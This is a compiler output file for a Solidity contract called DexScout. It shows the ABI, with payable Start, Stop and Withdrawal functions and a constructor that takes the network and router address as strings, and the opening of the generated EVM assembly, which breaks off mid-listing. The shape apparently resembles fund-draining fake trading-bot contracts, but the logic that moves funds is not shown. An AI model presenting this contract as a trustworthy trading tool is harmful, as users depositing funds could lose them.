{
	"dexscout.sol": {
		"DexScout": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "string",
							"name": "Network",
							"type": "string"
						},
						{
							"internalType": "string",
							"name": "routerAddress",
							"type": "string"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"internalType": "string",
							"name": "_msg",
							"type": "string"
						}
					],
					"name": "Log",
					"type": "event"
				},
				{
					"inputs": [],
					"name": "Start",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "Stop",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "Withdrawal",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"dexscout.sol\":682:16057  contract DexScout {... */\n  mstore(0x40, 0x80)\n    /* \"dexscout.sol\":823:1225  constructor(string memory Network, string memory routerAddress) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"dexscout.sol\":1171:1178  Network */\n  dup2\n    /* \"dexscout.sol\":1160:1168  _Network */\n  0x01\n    /* \"dexscout.sol\":1160:1178  _Network = Network */\n  swap1\n  dup2\n  tag_6\n  swap2\n  swap1\n  tag_7\n  jump\t// in\ntag_6:\n  pop\n    /* \"dexscout.sol\":1205:1218  routerAddress */\n  dup1\n    /* \"dexscout.sol\":1188:1202  _RouterAddress */\n  0x00\n    /* \"dexscout.sol\":1188:1218  _RouterAddress = routerAddress */\n  swap1\n  dup2\n  tag_8\n  swap2\n  swap1\n  tag_7\n  jump\t// in\ntag_8:\n  pop\n    /* \"dexscout.sol\":823:1225  constructor(string memory Network, string memory routerAddress) {... */\n  pop\n  pop\n    /* \"dexscout.sol\":682:16057  contract DexScout {... */\n  jump(tag_9)\n    /* \"#utility.yul\":7:82   */\ntag_10:\n    /* \"#utility.yul\":40:46   */\n  0x00\n    /* \"#utility.yul\":73:75   */\n  0x40\n    /* \"#utility.yul\":67:76   */\n  mload\n    /* \"#utility.yul\":57:76   */\n  swap1\n  pop\n    /* \"#utility.yul\":7:82   */\n  swap1\n  jump\t// out\n    /* \"#utility.yul\":88:205   */\ntag_11:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":211:328   */\ntag_12:\n    /* \"#utility.yul\":320:321   */\n  0x00\n    /* \"#utility.yul\":317:318   */\n  dup1\n    /* \"#utility.yul\":310:322   */\n  revert\n    /* \"#utility.yul\":334:451   */\ntag_13:\n    /* \"#utility.yul\":443:444   */\n  0x00\n    /* \"#utility.yul\":440:441   */\n  dup1\n    /* \"#utility.yul\":433:445   */\n  revert\n    /* \"#utility.yul\":457:574   */\ntag_14:\n    /* \"#utility.yul\":566:567   */\n  0x00\n    /* \"#utility.yul\":563:564   */\n  dup1\n    /* \"#utility.yul\":556:568   */\n  revert\n    /* \"#utility.yul\":580:682   */\ntag_15:\n    /* \"#utility.yul\":621:627   */\n  0x00\n    /* \"#utility.yul\":672:674   */\n  0x1f\n    /* \"#utility.yul\":668:675   */\n  not\n    /* \"#utility.yul\":663:665   */\n  0x1f\n    /* \"#utility.yul\":656:661   */\n  dup4\n    /* \"#utility.yul\":652:666   */\n  add\n    /* \"#utility.yul\":648:676   */\n  and\n    /* \"#utility.yul\":638:676   */\n  swap1\n  pop\n    /* \"#utility.yul\":580:682   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":688:868   */\ntag_16:\n    /* \"#utility.yul\":736:813   */\n  0x4e487b7100000000000000000000000000000000000000000000000000000000\n    /* \"#utility.yul\":733:734   */\n  0x00\n    /* \"#utility.yul\":726:814   */\n  mstore\n    /* \"#utility.yul\":833:837   */\n  0x41\n    /* \"#utility.yul\":830:831   */\n  0x04\n    /* \"#utility.yul\":823:838   */\n  mstore\n    /* \"#utility.yul\":857:861   */\n  0x24\n    /* \"#utility.yul\":854:855   */\n  0x00\n    /* \"#utility.yul\":847:862   */\n  revert\n    /* \"#utility.yul\":874:1155   */\ntag_17:\n    /* \"#utility.yul\":957:984   */\n  tag_51\n    /* \"#utility.yul\":979:983   */\n  dup3\n    /* \"#utility.yul\":957:984   */\n  tag_15\n  jump\t// in\ntag_51:\n    /* \"#utility.yul\":949:955   */\n  dup2\n    /* \"#utility.yul\":945:985   */\n  add\n    /* \"#utility.yul\":1087:1093   */\n  dup2\n    /* \"#utility.yul\":1075:1085   */\n  dup2\n    /* \"#utility.yul\":1072:1094   */\n  lt\n    /* \"#utility.yul\":1051:1069   */\n  0xffffffffffffffff\n    /* \"#utility.yul\":1039:1049   */\n  dup3\n    /* \"#utility.yul\":1036:1070   */\n  gt\n    /* \"#utility.yul\":1033:1095   */\n  or\n    /* \"#utility.yul\":1030:1118   */\n  iszero\n  tag_52\n  jumpi\n    /* \"#utility.yul\":1098:1116   */\n  tag_53\n  tag_16\n  jump\t// in\ntag_53:\n    /* \"#utility.yul\":1030:1118   */\ntag_52:\n    /* \"#utility.yul\":1138:1148   */\n  dup1\n    /* \"#utility.yul\":1134:1136   */\n  0x40\n    /* \"#utility.yul\":1127:1149   */\n  mstore\n    /* \"#utility.yul\":917:1155   */\n  pop\n    /* \"#utility.yul\":874:1155   */\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1161:1290   */\ntag_18:\n    /* \"#utility.yul\":1195:1201   */\n  0x00\n    /* \"#utility.yul\":1222:1242   */\n  tag_55\n  tag_10\n  jump\t// in\ntag_55:\n    /* \"#utility.yul\":1212:1242   */\n  swap1\n  pop\n    /* \"#utility.yul\":1251:1284   */\n  tag_56\n    /* \"#utility.yul\":1279:1283   */\n  dup3\n    /* \"#utility.yul\":1271:1277   */\n  dup3\n    /* \"#utility.yul\":1251:1284   */\n  tag_17\n  jump\t// in\ntag_56:\n    /* \"#utility.yul\":1161:1290   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1296:1604   */\ntag_19:\n    /* \"#utility.yul\":1358:1362   */\n  0x00\n    /* \"#utility.yul\":1448:1466   */\n  0xffffffffffffffff\n    /* \"#utility.yul\":1440:1446   */\n  dup3\n    /* \"#utility.yul\":1437:1467   */\n  gt\n    /* \"#utility.yul\":1434:1490   */\n  iszero\n  tag_58\n  jumpi\n    /* \"#utility.yul\":1470:1488   */\n  tag_59\n  tag_16\n  jump\t// in\ntag_59:\n    /* \"#utility.yul\":1434:1490   */\ntag_58:\n    /* \"#utility.yul\":1508:1537   */\n  tag_60\n    /* \"#utility.yul\":1530:1536   */\n  dup3\n    /* \"#utility.yul\":1508:1537   */\n  tag_15\n  jump\t// in\ntag_60:\n    /* \"#utility.yul\":1500:1537   */\n  swap1\n  pop\n    /* \"#utility.yul\":1592:1596   */\n  0x20\n    /* \"#utility.yul\":1586:1590   */\n  dup2\n    /* \"#utility.yul\":1582:1597   */\n  add\n    /* \"#utility.yul\":1574:1597   */\n  swap1\n  pop\n    /* \"#utility.yul\":1296:1604   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1610:1749   */\ntag_20:\n    /* \"#utility.yul\":1699:1705   */\n  dup3\n    /* \"#utility.yul\":1694:1697   */\n  dup2\n    /* \"#utility.yul\":1689:1692   */\n  dup4\n    /* \"#utility.yul\":1683:1706   */\n  mcopy\n    /* \"#utility.yul\":1740:1741   */\n  0x00\n    /* \"#utility.yul\":1731:1737   */\n  dup4\n    /* \"#utility.yul\":1726:1729   */\n  dup4\n    /* \"#utility.yul\":1722:1738   */\n  add\n    /* \"#utility.yul\":1715:1742   */\n  mstore\n    /* \"#utility.yul\":1610:1749   */\n  pop\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1755:2189   */\ntag_21:\n    /* \"#utility.yul\":1844:1849   */\n  0x00\n    /* \"#utility.yul\":1869:1935   */\n  tag_63\n    /* \"#utility.yul\":1885:1934   */\n  tag_64\n    /* \"#utility.yul\":1927:1933   */\n  dup5\n    /* \"#utility.yul\":1885:1934   */\n  tag_19\n  jump\t// in\ntag_64:\n    /* \"#utility.yul\":1869:1935   */\n  tag_18\n  jump\t// in\ntag_63:\n    /* \"#utility.yul\":1860:1935   */\n  swap1\n  pop\n    /* \"#utility.yul\":1958:1964   */\n  dup3\n    /* \"#utility.yul\":1951:1956   */\n  dup2\n    /* \"#utility.yul\":1944:1965   */\n  mstore\n    /* \"#utility.yul\":1996:2000   */\n  0x20\n    /* \"#utility.yul\":1989:1994   */\n  dup2\n    /* \"#utility.yul\":1985:2001   */\n  add\n    /* \"#utility.yul\":2034:2037   */\n  dup5\n    /* \"#utility.yul\":2025:2031   */\n  dup5\n    /* \"#utility.yul\":2020:2023   */\n  dup5\n    /* \"#utility.yul\":2016:2032   */\n  add\n    /* \"#utility.yul\":2013:2038   */\n  gt\n    /* \"#utility.yul\":2010:2122   */\n  iszero\n  tag_65\n  jumpi\n    /* \"#utility.yul\":2041:2120   */\n  tag_66\n  tag_14\n  jump\t// in\ntag_66:\n    /* \"#utility.yul\":2010:2122   */\ntag_65:\n    /* \"#utility.yul\":2131:2183   */\n  tag_67\n    /* \"#utility.yul\":2176:2182   */\n  dup5\n    /* \"#utility.yul\":2171:2174   */\n  dup3\n    /* \"#utility.yul\":2166:2169   */\n  dup6\n    /* \"#utility.yul\":2131:2183   */\n  tag_20\n  jump\t// in\ntag_67:\n    /* \"#utility.yul\":1850:2189   */\n  pop\n    /* \"#utility.yul\":1755:2189   */\n  swap4\n  swap3\n  pop\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":2209:2564   */\ntag_22:\n    /* \"#utility.yul\":2276:2281   */\n  0x00\n    /* \"#utility.yul\":2325:2328   */\n  dup3\n    /* \"#utility.yul\":2318:2322   */\n  0x1f\n    /* \"#utility.yul\":2310:2316   */\n  dup4\n    /* \"#utility.yul\":2306:2323   */\n  add\n    /* \"#utility.yul\":2302:2329   */\n  slt\n    /* \"#utility.yul\":2292:2414   */\n  tag_69\n  jumpi\n    /* \"#utility.yul\":2333:2412   */\n  tag_70\n  tag_13\n  jump\t// in\ntag_70:\n    /* \"#utility.yul\":2292:2414   */\ntag_69:\n    /* \"#utility.yul\":2443:2449   */\n  dup2\n    /* \"#utility.yul\":2437:2450   */\n  mload\n    /* \"#utility.yul\":2468:2558   */\n  tag_71\n    /* \"#utility.yul\":2554:2557   */\n  dup5\n    /* \"#utility.yul\":2546:2552   */\n  dup3\n    /* \"#utility.yul\":2539:2543   */\n  0x20\n    /* \"#utility.yul\":2531:2537   */\n  dup7\n    /* \"#utility.yul\":2527:2544   */\n  add\n    /* \"#utility.yul\":2468:2558   */\n  tag_21\n  jump\t// in\ntag_71:\n    /* \"#utility.yul\":2459:2558   */\n  swap2\n  pop\n    /* \"#utility.yul\":2282:2564   */\n  pop\n    /* \"#utility.yul\":2209:2564   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":2570:3423   */\ntag_3:\n    /* \"#utility.yul\":2669:2675   */\n  0x00\n    /* \"#utility.yul\":2677:2683   */\n  dup1\n    /* \"#utility.yul\":2726:2728   */\n  0x40\n    /* \"#utility.yul\":2714:2723   */\n  dup4\n    /* \"#utility.yul\":2705:2712   */\n  dup6\n    /* \"#utility.yul\":2701:2724   */\n  sub\n    /* \"#utility.yul\":2697:2729   */\n  slt\n    /* \"#utility.yul\":2694:2813   */\n  iszero\n  tag_73\n  jumpi\n    /* \"#utility.yul\":2732:2811   */\n  tag_74\n  tag_11\n  jump\t// in\ntag_74:\n    /* \"#utility.yul\":2694:2813   */\ntag_73:\n    /* \"#utility.yul\":2873:2874   */\n  0x00\n    /* \"#utility.yul\":2862:2871   */\n  dup4\n    /* \"#utility.yul\":2858:2875   */\n  add\n    /* \"#utility.yul\":2852:2876   */\n  mload\n    /* \"#utility.yul\":2903:2921   */\n  0xffffffffffffffff\n    /* \"#utility.yul\":2895:2901   */\n  dup2\n    /* \"#utility.yul\":2892:2922   */\n  gt\n    /* \"#utility.yul\":2889:3006   */\n  iszero\n  tag_75\n  jumpi\n    /* \"#utility.yul\":2925:3004   */\n  tag_76\n  tag_12\n  jump\t// in\ntag_76:\n    /* \"#utility.yul\":2889:3006   */\ntag_75:\n    /* \"#utility.yul\":3030:3104   */\n  tag_77\n    /* \"#utility.yul\":3096:3103   */\n  dup6\n    /* \"#utility.yul\":3087:3093   */\n  dup3\n    /* \"#utility.yul\":3076:3085   */\n  dup7\n    /* \"#utility.yul\":3072:3094   */\n  add\n    /* \"#utility.yul\":3030:3104   */\n  tag_22\n  jump\t// in\ntag_77:\n    /* \"#utility.yul\":3020:3104   */\n  swap3\n  pop\n    /* \"#utility.yul\":2823:3114   */\n  pop\n    /* \"#utility.yul\":3174:3176   */\n  0x20\n    /* \"#utility.yul\":3163:3172   */\n  dup4\n    /* \"#utility.yul\":3159:3177   */\n  add\n    /* \"#utility.yul\":3153:3178   */\n  mload\n    /* \"#utility.yul\":3205:3223   */\n  0xffffffffffffffff\n    /* \"#utility.yul\":3197:3203   */\n  dup2\n    /* \"#utility.yul\":3194:3224   */\n  gt\n    /* \"#utility.yul\":3191:3308   */\n  iszero\n  tag_78\n  jumpi\n    /* \"#utility.yul\":3227:3306   */\n  tag_79\n  tag_12\n  jump\t// in\ntag_79:\n    /* \"#utility.yul\":3191:3308   */\ntag_78:\n    /* \"#utility.yul\":3332:3406   */\n  tag_80\n    /* \"#utility.yul\":3398:3405   */\n  dup6\n    /* \"#utility.yul\":3389:3395   */\n  dup3\n    /* \"#utility.yul\":3378:3387   */\n  dup7\n    /* \"#utility.yul\":3374:3396   */\n  add\n    /* \"#utility.yul\":3332:3406   */\n  tag_22\n  jump\t// in\ntag_80:\n    /* \"#utility.yul\":3322:3406   */\n  swap2\n  pop\n    /* \"#utility.yul\":3124:3416   */\n  pop\n    /* \"#utility.yul\":2570:3423   */\n  swap3\n  pop\n  swap3\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":3429:3528   */\ntag_23:\n    /* \"#utility.yul\":3481:3487   */\n  0x00\n    /* \"#utility.yul\":3515:3520   */\n  dup2\n    /* \"#utility.yul\":3509:3521   */\n  mload\n    /* \"#utility.yul\":3499:3521   */\n  swap1\n  pop\n    /* \"#utility.yul\":3429:3528   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":3534:3714   */\ntag_24:\n    /* \"#utility.yul\":3582:3659   */\n  0x4e487b7100000000000000000000000000000000000000000000000000000000\n    /* \"#utility.yul\":3579:3580   */\n  0x00\n    /* \"#utility.yul\":3572:3660   */\n  mstore\n    /* \"#utility.yul\":3679:3683   */\n  0x22\n    /* \"#utility.yul\":3676:3677   */\n  0x04\n    /* \"#utility.yul\":3669:3684   */\n  mstore\n    /* \"#utility.yul\":3703:3707   */\n  0x24\n    /* \"#utility.yul\":3700:3701   */\n  0x00\n    /* \"#utility.yul\":3693:3708   */\n  revert\n    /* \"#utility.yul\":3720:4040   */\ntag_25:\n    /* \"#utility.yul\":3764:3770   */\n  0x00\n    /* \"#utility.yul\":3801:3802   */\n  0x02\n    /* \"#utility.yul\":3795:3799   */\n  dup3\n    /* \"#utility.yul\":3791:3803   */\n  div\n    /* \"#utility.yul\":3781:3803   */\n  swap1\n  pop\n    /* \"#utility.yul\":3848:3849   */\n  0x01\n    /* \"#utility.yul\":3842:3846   */\n  dup3\n    /* \"#utility.yul\":3838:3850   */\n  and\n    /* \"#utility.yul\":3869:3887   */\n  dup1\n    /* \"#utility.yul\":3859:3940   */\n  tag_84\n  jumpi\n    /* \"#utility.yul\":3925:3929   */\n  0x7f\n    /* \"#utility.yul\":3917:3923   */\n  dup3\n    /* \"#utility.yul\":3913:3930   */\n  and\n    /* \"#utility.yul\":3903:3930   */\n  swap2\n  pop\n    /* \"#utility.yul\":3859:3940   */\ntag_84:\n    /* \"#utility.yul\":3987:3989   */\n  0x20\n    /* \"#utility.yul\":3979:3985   */\n  dup3\n    /* \"#utility.yul\":3976:3990   */\n  lt\n    /* \"#utility.yul\":3956:3974   */\n  dup2\n    /* \"#utility.yul\":3953:3991   */\n  sub\n    /* \"#utility.yul\":3950:4034   */\n  tag_85\n  jumpi\n    /* \"#utility.yul\":4006:4024   */\n  tag_86\n  tag_24\n  jump\t// in\ntag_86:\n    /* \"#utility.yul\":3950:4034   */\ntag_85:\n    /* \"#utility.yul\":3771:4040   */\n  pop\n    /* \"#utility.yul\":3720:4040   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":4046:4187   */\ntag_26:\n    /* \"#utility.yul\":4095:4099   */\n  0x00\n    /* \"#utility.yul\":4118:4121   */\n  dup2\n    /* \"#utility.yul\":4110:4121   */\n  swap1\n  pop\n    /* \"#utility.yul\":4141:4144   */\n  dup2\n    /* \"#utility.yul\":4138:4139   */\n  0x00\n    /* \"#utility.yul\":4131:4145   */\n  mstore\n    /* \"#utility.yul\":4175:4179   */\n  0x20\n    /* \"#utility.yul\":4172:4173   */\n  0x00\n    /* \"#utility.yul\":4162:4180   */\n  keccak256\n    /* \"#utility.yul\":4154:4180   */\n  swap1\n  pop\n    /* \"#utility.yul\":4046:4187   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":4193:4286   */\ntag_27:\n    /* \"#utility.yul\":4230:4236   */\n  0x00\n    /* \"#utility.yul\":4277:4279   */\n  0x20\n    /* \"#utility.yul\":4272:4274   */\n  0x1f\n    /* \"#utility.yul\":4265:4270   */\n  dup4\n    /* \"#utility.yul\":4261:4275   */\n  add\n    /* \"#utility.yul\":4257:4280   */\n  div\n    /* \"#utility.yul\":4247:4280   */\n  swap1\n  pop\n    /* \"#utility.yul\":4193:4286   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":4292:4399   */\ntag_28:\n    /* \"#utility.yul\":4336:4344   */\n  0x00\n    /* \"#utility.yul\":4386:4391   */\n  dup3\n    /* \"#utility.yul\":4380:4384   */\n  dup3\n    /* \"#utility.yul\":4376:4392   */\n  shl\n    /* \"#utility.yul\":4355:4392   */\n  swap1\n  pop\n    /* \"#utility.yul\":4292:4399   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":4405:4798   */\ntag_29:\n    /* \"#utility.yul\":4474:4480   */\n  0x00\n    /* \"#utility.yul\":4524:4525   */\n  0x08\n    /* \"#utility.yul\":4512:4522   */\n  dup4\n    /* \"#utility.yul\":4508:4526   */\n  mul\n    /* \"#utility.yul\":4547:4644   */\n  tag_91\n    /* \"#utility.yul\":4577:4643   */\n  0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":4566:4575   */\n  dup3\n    /* \"#utility.yul\":4547:4644   */\n  tag_28\n  jump\t// in\ntag_91:\n    /* \"#utility.yul\":4665:4704   */\n  tag_92\n    /* \"#utility.yul\":4695:4703   */\n  dup7\n    /* \"#utility.yul\":4684:4693   */\n  dup4\n    /* \"#utility.yul\":4665:4704   */\n  tag_28\n  jump\t// in\ntag_92:\n    /* \"#utility.yul\":4653:4704   */\n  swap6\n  pop\n    /* \"#utility.yul\":4737:4741   */\n  dup1\n    /* \"#utility.yul\":4733:4742   */\n  not\n    /* \"#utility.yul\":4726:4731   */\n  dup5\n    /* \"#utility.yul\":4722:4743   */\n  and\n    /* \"#utility.yul\":4713:4743   */\n  swap4\n  pop\n    /* \"#utility.yul\":4786:4790   */\n  dup1\n    /* \"#utility.yul\":4776:4784   */\n  dup7\n    /* \"#utility.yul\":4772:4791   */\n  and\n    /* \"#utility.yul\":4765:4770   */\n  dup5\n    /* \"#utility.yul\":4762:4792   */\n  or\n    /* \"#utility.yul\":4752:4792   */\n  swap3\n  pop\n    /* \"#utility.yul\":4481:4798   */\n  pop\n  pop\n    /* \"#utility.yul\":4405:4798   */\n  swap4\n  swap3\n  pop\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":4804:4881   */\ntag_30:\n    /* \"#utility.yul\":4841:4848   */\n  0x00\n    /* \"#utility.yul\":4870:4875   */\n  dup2\n    /* \"#utility.yul\":4859:4875   */\n  swap1\n  pop\n    /* \"#utility.yul\":4804:4881   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":4887:4947   */\ntag_31:\n    /* \"#utility.yul\":4915:4918   */\n  0x00\n    /* \"#utility.yul\":4936:4941   */\n  dup2\n    /* \"#utility.yul\":4929:4941   */\n  swap1\n  pop\n    /* \"#utility.yul\":4887:4947   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":4953:5095   */\ntag_32:\n    /* \"#utility.yul\":5003:5012   */\n  0x00\n    /* \"#utility.yul\":5036:5089   */\n  tag_96\n    /* \"#utility.yul\":5054:5088   */\n  tag_97\n    /* \"#utility.yul\":5063:5087   */\n  tag_98\n    /* \"#utility.yul\":5081:5086   */\n  dup5\n    /* \"#utility.yul\":5063:5087   */\n  tag_30\n  jump\t// in\ntag_98:\n    /* \"#utility.yul\":5054:5088   */\n  tag_31\n  jump\t// in\ntag_97:\n    /* \"#utility.yul\":5036:5089   */\n  tag_30\n  jump\t// in\ntag_96:\n    /* \"#utility.yul\":5023:5089   */\n  swap1\n  pop\n    /* \"#utility.yul\":4953:5095   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":5101:5176   */\ntag_33:\n    /* \"#utility.yul\":5144:5147   */\n  0x00\n    /* \"#utility.yul\":5165:5170   */\n  dup2\n    /* \"#utility.yul\":5158:5170   */\n  swap1\n  pop\n    /* \"#utility.yul\":5101:5176   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":5182:5451   */\ntag_34:\n    /* \"#utility.yul\":5292:5331   */\n  tag_101\n    /* \"#utility.yul\":5323:5330   */\n  dup4\n    /* \"#utility.yul\":5292:5331   */\n  tag_32\n  jump\t// in\ntag_101:\n    /* \"#utility.yul\":5353:5444   */\n  tag_102\n    /* \"#utility.yul\":5402:5443   */\n  tag_103\n    /* \"#utility.yul\":5426:5442   */\n  dup3\n    /* \"#utility.yul\":5402:5443   */\n  tag_33\n  jump\t// in\ntag_103:\n    /* \"#utility.yul\":5394:5400   */\n  dup5\n    /* \"#utility.yul\":5387:5391   */\n  dup5\n    /* \"#utility.yul\":5381:5392   */\n  sload\n    /* \"#utility.yul\":5353:5444   */\n  tag_29\n  jump\t// in\ntag_102:\n    /* \"#utility.yul\":5347:5351   */\n  dup3\n    /* \"#utility.yul\":5340:5445   */\n  sstore\n    /* \"#utility.yul\":5258:5451   */\n  pop\n    /* \"#utility.yul\":5182:5451   */\n  pop\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":5457:5530   */\ntag_35:\n    /* \"#utility.yul\":5502:5505   */\n  0x00\n    /* \"#utility.yul\":5457:5530   */\n  swap1\n  jump\t// out\n    /* \"#utility.yul\":5536:5725   */\ntag_36:\n    /* \"#utility.yul\":5613:5645   */\n  tag_106\n  tag_35\n  jump\t// in\ntag_106:\n    /* \"#utility.yul\":5654:5719   */\n  tag_107\n    /* \"#utility.yul\":5712:5718   */\n  dup2\n    /* \"#utility.yul\":5704:5710   */\n  dup5\n    /* \"#utility.yul\":5698:5702   */\n  dup5\n    /* \"#utility.yul\":5654:5719   */\n  tag_34\n  jump\t// in\ntag_107:\n    /* \"#utility.yul\":5589:5725   */\n  pop\n    /* \"#utility.yul\":5536:5725   */\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":5731:5917   */\ntag_37:\n    /* \"#utility.yul\":5791:5911   */\ntag_109:\n    /* \"#utility.yul\":5808:5811   */\n  dup2\n    /* \"#utility.yul\":5801:5806   */\n  dup2\n    /* \"#utility.yul\":5798:5812   */\n  lt\n    /* \"#utility.yul\":5791:5911   */\n  iszero\n  tag_111\n  jumpi\n    /* \"#utility.yul\":5862:5901   */\n  tag_112\n    /* \"#utility.yul\":5899:5900   */\n  0x00\n    /* \"#utility.yul\":5892:5897   */\n  dup3\n    /* \"#utility.yul\":5862:5901   */\n  tag_36\n  jump\t// in\ntag_112:\n    /* \"#utility.yul\":5835:5836   */\n  0x01\n    /* \"#utility.yul\":5828:5833   */\n  dup2\n    /* \"#utility.yul\":5824:5837   */\n  add\n    /* \"#utility.yul\":5815:5837   */\n  swap1\n  pop\n    /* \"#utility.yul\":5791:5911   */\n  jump(tag_109)\ntag_111:\n    /* \"#utility.yul\":5731:5917   */\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":5923:6466   */\ntag_38:\n    /* \"#utility.yul\":6024:6026   */\n  0x1f\n    /* \"#utility.yul\":6019:6022   */\n  dup3\n    /* \"#utility.yul\":6016:6027   */\n  gt\n    /* \"#utility.yul\":6013:6459   */\n  iszero\n  tag_114\n  jumpi\n    /* \"#utility.yul\":6058:6096   */\n  tag_115\n    /* \"#utility.yul\":6090:6095   */\n  dup2\n    /* \"#utility.yul\":6058:6096   */\n  tag_26\n  jump\t// in\ntag_115:\n    /* \"#utility.yul\":6142:6171   */\n  tag_116\n    /* \"#utility.yul\":6160:6170   */\n  dup5\n    /* \"#utility.yul\":6142:6171   */\n  tag_27\n  jump\t// in\ntag_116:\n    /* \"#utility.yul\":6132:6140   */\n  dup2\n    /* \"#utility.yul\":6128:6172   */\n  add\n    /* \"#utility.yul\":6325:6327   */\n  0x20\n    /* \"#utility.yul\":6313:6323   */\n  dup6\n    /* \"#utility.yul\":6310:6328   */\n  lt\n    /* \"#utility.yul\":6307:6356   */\n  iszero\n  tag_117\n  jumpi\n    /* \"#utility.yul\":6346:6354   */\n  dup2\n    /* \"#utility.yul\":6331:6354   */\n  swap1\n  pop\n    /* \"#utility.yul\":6307:6356   */\ntag_117:\n    /* \"#utility.yul\":6369:6449   */\n  tag_118\n    /* \"#utility.yul\":6425:6447   */\n  tag_119\n    /* \"#utility.yul\":6443:6446   */\n  dup6\n    /* \"#utility.yul\":6425:6447   */\n  tag_27\n  jump\t// in\ntag_119:\n    /* \"#utility.yul\":6415:6423   */\n  dup4\n    /* \"#utility.yul\":6411:6448   */\n  add\n    /* \"#utility.yul\":6398:6409   */\n  dup3\n    /* \"#utility.yul\":6369:6449   */\n  tag_37\n  jump\t// in\ntag_118:\n    /* \"#utility.yul\":6028:6459   */\n  pop\n  pop\n    /* \"#utility.yul\":6013:6459   */\ntag_114:\n    /* \"#utility.yul\":5923:6466   */\n  pop\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":6472:6589   */\ntag_39:\n    /* \"#utility.yul\":6526:6534   */\n  0x00\n    /* \"#utility.yul\":6576:6581   */\n  dup3\n    /* \"#utility.yul\":6570:6574   */\n  dup3\n    /* \"#utility.yul\":6566:6582   */\n  shr\n    /* \"#utility.yul\":6545:6582   */\n  swap1\n  pop\n    /* \"#utility.yul\":6472:6589   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":6595:6764   */\ntag_40:\n    /* \"#utility.yul\":6639:6645   */\n  0x00\n    /* \"#utility.yul\":6672:6723   */\n  tag_122\n    /* \"#utility.yul\":6720:6721   */\n  0x00\n    /* \"#utility.yul\":6716:6722   */\n  not\n    /* \"#utility.yul\":6708:6713   */\n  dup5\n    /* \"#utility.yul\":6705:6706   */\n  0x08\n    /* \"#utility.yul\":6701:6714   */\n  mul\n    /* \"#utility.yul\":6672:6723   */\n  tag_39\n  jump\t// in\ntag_122:\n    /* \"#utility.yul\":6668:6724   */\n  not\n    /* \"#utility.yul\":6753:6757   */\n  dup1\n    /* \"#utility.yul\":6747:6751   */\n  dup4\n    /* \"#utility.yul\":6743:6758   */\n  and\n    /* \"#utility.yul\":6733:6758   */\n  swap2\n  pop\n    /* \"#utility.yul\":6646:6764   */\n  pop\n    /* \"#utility.yul\":6595:6764   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":6769:7064   */\ntag_41:\n    /* \"#utility.yul\":6845:6849   */\n  0x00\n    /* \"#utility.yul\":6991:7020   */\n  tag_124\n    /* \"#utility.yul\":7016:7019   */\n  dup4\n    /* \"#utility.yul\":7010:7014   */\n  dup4\n    /* \"#utility.yul\":6991:7020   */\n  tag_40\n  jump\t// in\ntag_124:\n    /* \"#utility.yul\":6983:7020   */\n  swap2\n  pop\n    /* \"#utility.yul\":7053:7056   */\n  dup3\n    /* \"#utility.yul\":7050:7051   */\n  0x02\n    /* \"#utility.yul\":7046:7057   */\n  mul\n    /* \"#utility.yul\":7040:7044   */\n  dup3\n    /* \"#utility.yul\":7037:7058   */\n  or\n    /* \"#utility.yul\":7029:7058   */\n  swap1\n  pop\n    /* \"#utility.yul\":6769:7064   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":7069:8464   */\ntag_7:\n    /* \"#utility.yul\":7186:7223   */\n  tag_126\n    /* \"#utility.yul\":7219:7222   */\n  dup3\n    /* \"#utility.yul\":7186:7223   */\n  tag_23\n  jump\t// in\ntag_126:\n    /* \"#utility.yul\":7288:7306   */\n  